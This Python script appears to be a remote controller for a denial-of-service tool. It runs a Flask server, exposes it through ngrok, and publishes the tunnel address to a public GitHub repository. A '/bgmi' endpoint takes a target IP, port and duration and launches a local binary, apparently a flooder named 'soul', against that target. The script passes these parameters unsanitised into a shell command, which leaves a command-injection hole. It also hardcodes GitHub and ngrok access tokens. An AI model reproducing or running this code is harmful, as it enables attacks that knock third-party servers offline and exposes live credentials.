import os
import subprocess
import threading
from flask import Flask, request, jsonify, send_from_directory
from pyngrok import ngrok
import requests
import time
import base64

active_processes = {}
GITHUB_API_URL = "https://api.github.com"
GITHUB_TOKEN = "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"
GITHUB_USERNAME = "Tofiq780065"

def install_packages():
    required_packages = ['Flask', 'pyngrok', 'requests']
    for package in required_packages:
        try:
            subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'show', package])
        except subprocess.CalledProcessError:
            try:
                subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'install', package])
                print(f"{package} installed successfully.")
            except subprocess.CalledProcessError:
                print(f"Failed to install {package}.")

def create_github_repo():
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github+json",
    }
    repo_data = {
        "name": "soul",
        "description": "Soul bot repository",
        "private": False,
    }
    
    try:
        url = f"{GITHUB_API_URL}/user/repos"
        response = requests.post(url, headers=headers, json=repo_data)
        
        if response.status_code == 201:
            print(f"Repository created successfully: {repo_data['name']}")
        else:
            print(f"Failed to create repository: {response.json()}")
    except Exception as e:
        print(f"Error creating GitHub repo: {str(e)}")

def configure_ngrok_with_retry():
    ngrok_token = "2rabClKinCqfSvlcS8aVZ4ZlLSw_7C4gn54kZtm28FYdrcih"
    ngrok.set_auth_token(ngrok_token)

    retry_delay = 5

    while True:
        try:
            public_url_obj = ngrok.connect(5002)
            public_url = public_url_obj.public_url
            print(f"ngrok connected successfully: {public_url}")
            return public_url
        except Exception as e:
            print(f"ngrok connection failed: {str(e)}")
            if "ERR_NGROK_108" in str(e):
                print("Retrying in 5 seconds...")
                time.sleep(retry_delay)
            else:
                print("Unexpected error, retrying in 5 seconds...")
                time.sleep(retry_delay)
                
def upload_to_github(file_path):
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github+json",
    }
    repo = "soul"
    file_name = os.path.basename(file_path)
    
    sha = None
    try:
        # Fetch the current file from GitHub to get its latest SHA
        url = f"{GITHUB_API_URL}/repos/{GITHUB_USERNAME}/{repo}/contents/{file_name}"
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            sha = response.json().get("sha")
            print(f"Found existing file {file_name} with sha: {sha}")
        elif response.status_code == 404:
            print(f"{file_name} does not exist on GitHub. A new file will be created.")
        else:
            print(f"Failed to fetch file {file_name}: {response.json()}")
            return
    except Exception as e:
        print(f"Error fetching file from GitHub: {str(e)}")
        return
    
    with open(file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode("utf-8")

    data = {
        "message": f"Add or update {file_name}",
        "content": encoded_content,
    }

    if sha:
        # Include the sha to update the file
        data["sha"] = sha

    try:
        url = f"{GITHUB_API_URL}/repos/{GITHUB_USERNAME}/{repo}/contents/{file_name}"
        response = requests.put(url, headers=headers, json=data)
        
        if response.status_code == 201:
            print(f"{file_name} uploaded successfully to GitHub.")
        elif response.status_code == 200:
            print(f"{file_name} updated successfully on GitHub.")
        else:
            print(f"Failed to upload {file_name} to GitHub: {response.json()}")
    except Exception as e:
        print(f"Error uploading to GitHub: {str(e)}")

def update_jony_txt(public_url):
    file_path = "jony.txt"

    if os.path.exists(file_path):
        os.remove(file_path)
        print(f"Old {file_path} deleted.")

    with open(file_path, "w") as file:
        file.write(public_url)
    print(f"New ngrok link saved in {file_path}")
    upload_to_github(file_path)

def execute_command_async(command, duration):
    def run(command_id):
        try:
            process = subprocess.Popen(command, shell=True)
            active_processes[command_id] = process.pid
            print(f"Command executed: {command} with PID: {process.pid}")

            time.sleep(duration)

            if process.pid in active_processes.values():
                process.terminate()
                process.wait()
                del active_processes[command_id]
                print(f"Process {process.pid} terminated after {duration} seconds.")
        except Exception as e:
            print(f"Error executing command: {str(e)}")

    command_id = f"cmd_{len(active_processes) + 1}"
    thread = threading.Thread(target=run, args=(command_id,))
    thread.start()
    return {"status": "Command execution started", "duration": duration}

def run_flask_app():
    app = Flask(__name__)

    @app.route('/favicon.ico')
    def favicon():
        return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')

    try:
        public_url = configure_ngrok_with_retry()
        update_jony_txt(public_url)
    except Exception as e:
        print(f"Failed to start ngrok: {str(e)}")
        return

    @app.route('/bgmi', methods=['GET'])
    def bgmi():
        ip = request.args.get('ip')
        port = request.args.get('port')
        duration = request.args.get('time')

        if not ip or not port or not duration:
            return jsonify({'error': 'Missing parameters'}), 400

        command = f"./soul {ip} {port} {duration} 900"
        response = execute_command_async(command, int(duration))
        return jsonify(response)

    print("Starting Flask server...")
    app.run(host='0.0.0.0', port=5002)

if __name__ == "__main__":
    install_packages()
    create_github_repo()
    run_flask_app()
